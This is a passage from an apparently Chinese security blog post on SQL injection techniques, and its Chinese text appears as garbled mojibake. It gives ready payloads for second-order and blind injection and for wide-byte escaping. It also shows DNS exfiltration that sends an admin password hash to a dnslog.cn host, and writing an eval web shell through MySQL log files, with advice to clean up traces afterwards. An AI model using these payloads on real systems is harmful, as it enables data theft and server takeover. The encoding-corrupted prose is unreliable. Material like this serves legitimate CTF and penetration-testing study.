&quot;;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†è„æ•°æ®å–å‡ºå¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œé€ æˆäº†sqlæ³¨å…¥ã€‚</p><h5 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h5><p>å°†ä¿å­˜çš„è„æ•°æ®ä»æ•°æ®åº“ä¸­å–å‡ºï¼Œå†æ¬¡è¿›è¡Œsqlæ“ä½œçš„åœºæ™¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹å¯†ç </span><br><span class="line">ä¿®æ”¹è®¢å•</span><br><span class="line">æ€»ä¹‹å°±æ˜¯ä¿®æ”¹å·²ä¿å­˜ä¿¡æ¯çš„åœ°æ–¹</span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><h6 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);<span class="comment">#å¯æ§å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;<span class="comment">#å°†$_POST[&quot;address&quot;]ä¿å­˜åˆ°æ•°æ®åº“ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#$rowä¿å­˜sqlè¯­å¥æŸ¥è¯¢ç»“æœ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];<span class="comment">#è°ƒç”¨äº†æŸ¥è¯¢ç»“æœ</span></span><br></pre></td></tr></table></figure><p>åˆ†æä¸Šé¢ä¸¤æ¡è¯­å¥ï¼Œå¯¹å¯æ§å‚æ•°addressåªè¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œå°±ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚</p><p>å¹¶ä¸”åœ¨updateä¸­å¼•ç”¨äº†<code>$row[&#39;address&#39;]</code>ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><p>å¯ä»¥çœ‹åˆ°åˆ—åä¸ºold_addressï¼Œåœ¨è¿›è¡Œä¿®æ”¹æ—¶ï¼Œä¼šå°†æ—§åœ°å€ä¿å­˜ä¸‹æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨ç¬¬ä¸€æ¬¡ä¿®æ”¹æ—¶ï¼Œåœ¨addresså¤„æ³¨å…¥æ¶æ„ä»£ç ï¼Œç¬¬äºŒæ¬¡ä¿®æ”¹æŸ¥è¯¢æ—§åœ°å€æ—¶å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)# </span><br></pre></td></tr></table></figure><h4 id="ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥"><a href="#ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥" class="headerlink" title="ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥"></a>ç›²æ³¨â€“æ— å›æ˜¾æ³¨å…¥</h4><p>æ¨èé˜…è¯»ï¼š<a href="https://www.anquanke.com/post/id/266244">https://www.anquanke.com/post/id/266244</a></p><h5 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h5><p>é¡µé¢æ— æ•°æ®å›æ˜¾ï¼Œä½†æ˜¯æœ‰ä¸¤ç§è¿”å›çŠ¶æ€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 --+ # True</span><br><span class="line">?id=1&#x27; and 1=2 --+ # False</span><br></pre></td></tr></table></figure><p>å®é™…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=å­æŸ¥è¯¢ --+  </span><br></pre></td></tr></table></figure><p>å­æŸ¥è¯¢&#x3D;å­—ç¬¦ä¸²æˆªå–+æ¯”è¾ƒ</p><h6 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h6><p><code>and 1=</code></p><table><thead><tr><th align="center">é€»è¾‘è¿æ¥ç¬¦</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">æˆ–</td><td align="center">or ï¼Œ||</td></tr><tr><td align="center">å¼‚æˆ–</td><td align="center">xorï¼Œ^</td></tr><tr><td align="center">æŒ‰ä½ä¸&#x2F;æˆ–</td><td align="center">&amp;ï¼Œ|</td></tr></tbody></table><p>å­—ç¬¦ä¸²æˆªå–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä»startä½ç½®å¼€å§‹,æˆªå–lenä¸ªå­—ç¬¦</span><br><span class="line">substr(string,start,len)</span><br><span class="line">mid(string,start,len)</span><br><span class="line"></span><br><span class="line"># ä»å·¦/å³æˆªå–lenä¸ªå­—ç¬¦</span><br><span class="line">left(string,len)</span><br><span class="line">right(string,len)</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like binary 0x25&#123;&#125;&#123;&#125;25</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230505230426015.png" alt="image-20230505230426015"></p><blockquote><p>å› ä¸ºå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥è¦ç”¨<code>binary</code></p><p>BINARYå°†16è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p></blockquote><p>è¯­æ³•</p><table><thead><tr><th align="center">like</th><th align="center">æ­£åˆ™</th></tr></thead><tbody><tr><td align="center">_</td><td align="center">.</td></tr><tr><td align="center">%</td><td align="center">.*</td></tr><tr><td align="center">[]</td><td align="center">[]</td></tr><tr><td align="center">[^]</td><td align="center">[^]</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regexp &quot;^a&quot;</span><br><span class="line">regexp &quot;^ab&quot;</span><br></pre></td></tr></table></figure><h5 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h5><p>æ—¶é—´ç›²æ³¨å°±æ˜¯<strong>åœ¨å¸ƒå°”ç›²æ³¨ä¸ŠåŠ äº†å»¶è¿Ÿæ—¶é—´å‡½æ•°sleep()</strong>,ç”¨åœ¨Trueå’ŒFalseå›æ˜¾éš¾ä»¥åŒºåˆ†æ—¶,é€šè¿‡é¡µé¢çš„å“åº”æ—¶é—´æ¥åˆ¤æ–­å¸ƒå°”é€»è¾‘çš„æ­£ç¡®ä¸å¦ã€‚</p><h6 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(å¸ƒå°”,A,B)ä¸ä¸‰ç›®è¿ç®—ç¬¦é€»è¾‘ä¸€æ ·,åŠ ä¸Šsleepå‡½æ•°</span><br><span class="line"></span><br><span class="line">sleep(if(å¸ƒå°”,A,B))å¸ƒå°”æ­£ç¡®,å»¶è¿ŸAç§’,å¸ƒå°”é”™è¯¯,å»¶è¿ŸBç§’</span><br><span class="line"></span><br><span class="line">æˆ–è€… if(å¸ƒå°”,1,sleep(x))å¸ƒå°”æ­£ç¡®,æ— å»¶è¿Ÿ,å¸ƒå°”é”™è¯¯,å»¶è¿Ÿxç§’</span><br></pre></td></tr></table></figure><p>![image-20230312232840696](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;typora img&#x2F;image-20230312232840696.png)</p><h6 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h6><p>èƒ½é€ æˆå»¶æ—¶æ•ˆæœçš„è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># é€šè¿‡æ‰§è¡Œå¤šæ¬¡å‘½ä»¤å½¢æˆå»¶æ—¶</span><br><span class="line">benchmark(æ‰§è¡Œæ¬¡æ•°,sqlè¯­å¥)</span><br><span class="line"></span><br><span class="line"># æŸ¥è¯¢ä¸€äº›æ•°æ®é‡æ¯”è¾ƒå¤§çš„è¡¨åšç¬›å¡å°”é›†è¿ç®—ï¼Œå¯¼è‡´æŸ¥è¯¢ç¼“æ…¢</span><br><span class="line">select * from tab1 cross join tab2;</span><br><span class="line">select * from tab1,tab2;</span><br></pre></td></tr></table></figure><h5 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h5><p>ç›²æ³¨éƒ½æ˜¯éœ€è¦è„šæœ¬çš„ï¼Œæˆ–è€…ç”¨sqlmap</p><h4 id="DNSå¤–å¸¦æ³¨å…¥"><a href="#DNSå¤–å¸¦æ³¨å…¥" class="headerlink" title="DNSå¤–å¸¦æ³¨å…¥"></a>DNSå¤–å¸¦æ³¨å…¥</h4><p>æ¨èé˜…è¯»ï¼š<a href="https://www.anquanke.com/post/id/98096">Dnslogåœ¨SQLæ³¨å…¥ä¸­çš„å®æˆ˜-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a></p><h5 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a>åŸç†</h5><ol><li><p>MySQL Load_File()å‡½æ•°å¯ä»¥å‘èµ·è¯·æ±‚ï¼Œä½¿ç”¨Dnslogæ¥æ”¶è¯·æ±‚ï¼Œè·å–æ•°æ®ï¼›</p></li><li><p>windowsä¸‹å­˜åœ¨<code>UNCè·¯å¾„</code></p><blockquote><p>UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\xxxx\xx</span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20230425175525555.png" alt="image-20230425175525555"></p><p>   <img src="/../images/image-20230425175452805.png" alt="image-20230425175452805"></p></li></ol><h5 id="ä½¿ç”¨æ¡ä»¶"><a href="#ä½¿ç”¨æ¡ä»¶" class="headerlink" title="ä½¿ç”¨æ¡ä»¶"></a>ä½¿ç”¨æ¡ä»¶</h5><ul><li>windowsç³»ç»Ÿ</li><li><code>secure_file_priv</code>ä¸ºç©º</li></ul><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> hex(passwd) <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.2fzz61.dnslog.cn\\abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Hexç¼–ç çš„ç›®çš„æ˜¯å‡å°‘å¹²æ‰°ï¼ŒåŸŸåæœ‰ä¸€å®šçš„è§„èŒƒï¼Œæœ‰äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½å¸¦å…¥</span></span><br><span class="line"><span class="comment">-- \\\\è½¬ä¹‰  â†’  \\</span></span><br></pre></td></tr></table></figure><h4 id="SMBå¤–å¸¦æ³¨å…¥"><a href="#SMBå¤–å¸¦æ³¨å…¥" class="headerlink" title="SMBå¤–å¸¦æ³¨å…¥"></a>SMBå¤–å¸¦æ³¨å…¥</h4><p><a href="http://www.moonslow.com/article/smb_sql_injection">http://www.moonslow.com/article/smb_sql_injection</a></p><h4 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h4><h5 id="åŸç†-5"><a href="#åŸç†-5" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>From:<a href="https://cloud.tencent.com/developer/article/1938545">https://cloud.tencent.com/developer/article/1938545</a></p><p>å®½å­—èŠ‚ï¼šå¦‚æœä¸€ä¸ªå­—ç¬¦çš„å¤§å°æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„ï¼Œè¯¥å­—ç¬¦ç§°ä¸ºå®½å­—èŠ‚å­—ç¬¦</p><p><code>PHP</code>ä¸<code>Mysql</code>ä¹‹é—´çš„äº¤äº’</p><p><img src="/../images/5917903e25c36c63ec29ad5237c2f7a4.png" alt="img"></p><p>å°†phpçš„sqlè¯­å¥ä»¥<code>character_set_client</code>ç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬ä¸º16è¿›åˆ¶æ•°ï¼‰ï¼Œå†å°†16è¿›åˆ¶æ•°ä»¥<code>character_set_connection</code>è¿›è¡Œç¼–ç ï¼ˆä¹Ÿå°±æ˜¯è½¬æ¢ä¸ºurlç¼–ç ï¼‰ï¼Œç„¶åä»¥å†…éƒ¨æ“ä½œå­—ç¬¦é›†è¿›è¡Œurlè§£ç ï¼Œæœ€åä»¥<code>character_set_results</code>ç¼–ç è¾“å‡ºç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%df%<span class="number">27</span> æµè§ˆå™¨urlè‡ªåŠ¨è§£ç ===&gt; Î²<span class="string">&#x27; è½¬ä¹‰===&gt;Î²\&#x27;è½¬ä¸º16è¿›åˆ¶===&gt; 0xdf0x5c0x27 è½¬æ¢ä¸ºurlç¼–ç ===&gt; %df%5c%27 è¿›è¡Œurlè§£ç (å› ä¸ºæ˜¯GBKç¼–ç ï¼Œ%dfå’Œ%5cç»“åˆä¸ºæ±‰å­—)===&gt; é‹&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ä¾‹é¢˜-2"><a href="#ä¾‹é¢˜-2" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h5><p><code>sql-lab less-32</code></p><p>è½¬ä¹‰å­—ç¬¦</p><p><img src="/../images/image-20230522170722857.png" alt="image-20230522170722857"></p><p>è®¾ç½®ç¼–ç é›†</p><p><img src="/../images/image-20230522170750335.png" alt="image-20230522170750335"></p><p>sqlè¯­å¥ï¼Œå•å¼•å·é—­åˆ</p><p><img src="/../images/image-20230522171701503.png" alt="image-20230522171701503"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171728569.png" alt="image-20230522171728569"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%df%<span class="number">27</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522171841053.png" alt="image-20230522171841053"></p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Linux è‡ªå¸¦çš„ iconv å‘½ä»¤è¿›è¡Œ UTF çš„ç¼–ç è½¬æ¢</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-16</span><br><span class="line">echo \&#x27;|iconv -f utf-8 -t utf-32</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121013028.png" alt="image-20230523121013028"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1ï¿½&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523121159948.png" alt="image-20230523121159948"></p><h4 id="order-by-æ³¨å…¥"><a href="#order-by-æ³¨å…¥" class="headerlink" title="order by æ³¨å…¥"></a>order by æ³¨å…¥</h4><p><a href="https://www.cnblogs.com/1ink/p/15107674.html">https://www.cnblogs.com/1ink/p/15107674.html</a></p><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><h5 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h5><h6 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h6><ul><li><p>é«˜æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user, file_priv from mysql.user; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210141344.png" alt="image-20230528210141344"></p></li><li><p>çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p></li><li><p><code>secure_fil_priv</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;; # showè¯­å¥è¦å †å æ³¨å…¥å’Œå›æ˜¾</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230522174929267.png" alt="image-20230522174929267"></p><h6 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h6><p><strong>åŸºäºè”åˆæŸ¥è¯¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into  dumpfile &#x27;C:\info2.php&#x27;;</span><br></pre></td></tr></table></figure><p><code>outfile</code>å’Œ<code>dumpfile</code>çš„åŒºåˆ«</p><ul><li><code>outfile</code>å¯¼å‡ºæ•°æ®æ”¯æŒå¤šè¡Œï¼Œ<code>dumpfile</code>åªæ”¯æŒä¸€è¡Œ</li><li><code>outfile</code>ä¼šå¯¹æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œ<code>dumpfile</code>ä¸ä¼š</li></ul><p>æ‰€ä»¥ä½¿ç”¨<code>into dumpfile</code>è¿™ä¸ªå‡½æ•°æ¥å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶</p><p><img src="/../images/image-20230522180009679.png" alt="image-20230522180009679"></p><p><strong>éè”åˆæŸ¥è¯¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select *from users where id=1 into outfile &#x27;C:\info.php&#x27; fields terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">select *from users where id=1 into outfile &#x27;C:\info2.php&#x27; lines terminated by &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522180543767.png" alt="image-20230522180543767"></p><h5 id="å†™å…¥æ—¥å¿—æ–‡ä»¶"><a href="#å†™å…¥æ—¥å¿—æ–‡ä»¶" class="headerlink" title="å†™å…¥æ—¥å¿—æ–‡ä»¶"></a>å†™å…¥æ—¥å¿—æ–‡ä»¶</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --æŸ¥çœ‹é…ç½®ï¼Œæ—¥å¿—æ˜¯å¦å¼€å¯ï¼Œå’Œmysqlé»˜è®¤logåœ°å€(è®°ä¸‹åŸåœ°å€æ–¹ä¾¿æ¢å¤)</span><br><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line"></span><br><span class="line">set global general_log = on;</span><br><span class="line"></span><br><span class="line">set global general_log_file = &#x27;e:\info.php&#x27;; # è¿™é‡Œæ—¥å¿—åˆ›å»ºæƒé™è¦ä½ä¸€äº›ï¼Œä¸èƒ½åœ¨cç›˜åˆ›å»º</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">--ç»“æŸåï¼Œç—•è¿¹æ¸…ç†</span><br></pre></td></tr></table></figure><p>æ—¥å¿—æ…¢æŸ¥è¯¢</p><p>Fromï¼š<a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></p><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨æ…¢æŸ¥è¯¢å†™å‘¢ï¼Ÿå› ä¸ºå¼€å¯æ—¥å¿—ç›‘æµ‹åæ–‡ä»¶ä¼šå¾ˆå¤§ï¼Œç½‘ç«™è®¿é—®é‡å¤§çš„è¯æˆ‘ä»¬å†™çš„shellä¼šå‡ºé”™</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;--æŸ¥çœ‹æ…¢æŸ¥è¯¢ä¿¡æ¯</span><br><span class="line">set global slow_query_log=1;--å¯ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—(é»˜è®¤ç¦ç”¨)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;--ä¿®æ”¹æ—¥å¿—æ–‡ä»¶è·¯å¾„</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br><span class="line">--æŸ¥çœ‹é»˜è®¤æ—¶é—´å€¼ï¼Œå½“sqlè¯­å¥æ‰§è¡Œæ—¶é—´è¶…è¿‡è¯¥å€¼æ‰ä¼šè¢«è®¡å…¥æ—¥å¿—ä¸­ï¼Œé»˜è®¤10ç§’</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(@@long_query_time+1);--å†™shellåˆ°æ…¢æŸ¥è¯¢æ—¥å¿—</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522182142555.png" alt="image-20230522182142555"></p><h5 id="sqlmap-â€“os-shell"><a href="#sqlmap-â€“os-shell" class="headerlink" title="sqlmap  â€“os-shell"></a>sqlmap  â€“os-shell</h5><ul><li><p>å¤§è‡´æµç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è·å–ç›®æ ‡ä¿¡æ¯â†’ä½¿ç”¨lines terminated byå°†å…·æœ‰æ–‡ä»¶ä¸Šä¼ çš„ğŸä¸Šä¼ åˆ°ç½‘ç«™â†’é€çº§ç›®å½•è®¿é—®æ‰¾åˆ°ğŸ</span><br><span class="line"></span><br><span class="line">â†’é€šè¿‡è¯¥ğŸä¸Šä¼ çœŸæ­£çš„å‘½ä»¤ğŸâ†’æµ‹è¯•å‘½ä»¤ğŸèƒ½å¦æ‰§è¡Œâ†’åˆ é™¤ä¸Šä¼ çš„ä¸¤ä¸ªğŸ</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä¸Šä¼ ğŸï¼šformè¡¨å•</p></li><li><p>phpå‘½ä»¤é©¬ï¼šè·å¾—<code>disable_function</code>ï¼Œéå†æ‰€æœ‰ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œåˆ¤æ–­å“ªä¸€ä¸ªä¸åœ¨<code>disable_function</code>ã€‚</p></li></ul><h4 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h4><h5 id="LOAD-DATA-LOCALâ€”ä»»æ„è¯»å–"><a href="#LOAD-DATA-LOCALâ€”ä»»æ„è¯»å–" class="headerlink" title="LOAD DATA LOCALâ€”ä»»æ„è¯»å–"></a><code>LOAD DATA LOCAL</code>â€”ä»»æ„è¯»å–</h5><h6 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h6><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h6 id="åŸç†å’Œæ”»å‡»æ€è·¯"><a href="#åŸç†å’Œæ”»å‡»æ€è·¯" class="headerlink" title="åŸç†å’Œæ”»å‡»æ€è·¯"></a>åŸç†å’Œæ”»å‡»æ€è·¯</h6><p><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»é“¾æ‹“å±•</a></p><blockquote><p>æ–‡ä»¶è¯»å–<code>Phar</code>æ–‡ä»¶ï¼Œé€ æˆphpååºåˆ—åŒ–</p></blockquote><h6 id="æ¡ä»¶-1"><a href="#æ¡ä»¶-1" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h6><ul><li><p>å®¢æˆ·ç«¯å¿…é¡»å¯ç”¨LOCAL-INFILE </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿æ¥æ—¶å‚æ•°--local-infile=OFF å¯ä»¥ä¿®å¤ï¼Œæˆ–è€…æ›´æ”¹å…¨å±€å˜é‡local_infile(æˆ‘åœ¨5.7ä¸‹å‚æ•°å¯ä»¥ï¼Œæ›´æ”¹å…¨å±€å˜é‡ä¸è¡Œï¼Ÿï¼Ÿ)</span><br></pre></td></tr></table></figure></li><li><p>å®¢æˆ·ç«¯æ”¯æŒéSSLè¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿æ¥æ—¶å‚æ•°--ssl-mode=VERIFY_IDENTITY å¯ä»¥ä¿®å¤</span><br></pre></td></tr></table></figure></li><li><p>ç›®æ ‡webå­˜åœ¨è¿æ¥æ•°æ®åº“çš„åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“å¼±å£ä»¤æ‰«æï¼Œè¿æ¥æ£€æŸ¥</span><br><span class="line">ç½‘ç«™é‡è£…æ¼æ´ï¼ˆéœ€è¦è¿æ¥æ•°æ®åº“ï¼‰</span><br><span class="line">æ•°æ®è¿ç§»æœåŠ¡</span><br><span class="line">Excleä»æ•°æ®åº“ä¸­åŒæ­¥æ•°æ®åˆ°è¡¨æ ¼å†…</span><br></pre></td></tr></table></figure></li></ul><h6 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„mysqléƒ½æ˜¯5.7ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p><code>mysql5.7</code>é»˜è®¤å¼€å¯</p><p><img src="/../images/image-20230523163445312.png" alt="image-20230523163445312"></p><p>æ³¨ï¼šä¸€å¼€å§‹ä½¿ç”¨æœåŠ¡ç«¯ä½¿ç”¨8ç‰ˆæœ¬ä¸è¡Œ</p><p>æ”»å‡»è€…ï¼ˆæœåŠ¡ç«¯ï¼‰èµ·è„šæœ¬</p><p><img src="/../images/image-20230523162503899.png" alt="image-20230523162503899"></p><p><img src="/../images/image-20230523162623757.png" alt="image-20230523162623757"></p><p>å—å®³è€…è¿æ¥</p><p><img src="/../images/image-20230523162534773.png" alt="image-20230523162534773"></p><p>æ”»å‡»è€…æŸ¥çœ‹<code>mysql.log</code></p><p><img src="/../images/image-20230523162727437.png" alt="image-20230523162727437"></p><h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a><code>load_file</code></h5><p><strong>æ³¨æ„ï¼šè½¬ä¹‰å­—ç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;e:\test.txt&#x27;); # \t é”™è¯¯è·¯å¾„</span><br><span class="line">select load_file(&#x27;e:\\test.txt&#x27;);# æ­£ç¡®</span><br><span class="line">select load_file(0x653A5C746573742E747874);# æ”¯æŒåå…­è¿›åˆ¶</span><br><span class="line">select load_file(char(101,58,92,116,101,115,116,46,116,120,116));# æ”¯æŒcharå‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230523134023401.png" alt="image-20230523134023401"></p><h5 id="load-data"><a href="#load-data" class="headerlink" title="load data "></a><code>load data </code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table 